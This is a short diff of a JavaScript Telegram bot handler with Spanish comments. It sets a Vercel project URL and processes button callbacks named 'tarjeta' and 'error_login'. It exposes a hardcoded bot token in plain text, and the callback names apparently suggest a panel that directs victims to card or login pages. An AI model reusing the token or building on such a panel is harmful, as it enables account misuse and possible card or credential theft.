@@ -5,7 +5,7 @@ const TOKEN = "7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4";
 const URL_API = `https://api.telegram.org/bot${TOKEN}`;
 
 // ⚠️ REEMPLAZA CON LA URL DE TU PROYECTO DE VERCEL:
-const URL_VERCEL_PROYECTO = "https://tu-proyecto.vercel.app"; 
+const URL_VERCEL_PROYECTO = "https://pacid-x3fc.vercel.app/"; 
 
 async function procesarBoton(callbackQuery) {
     const data = callbackQuery.data; // 'tarjeta', 'error_login', etc.
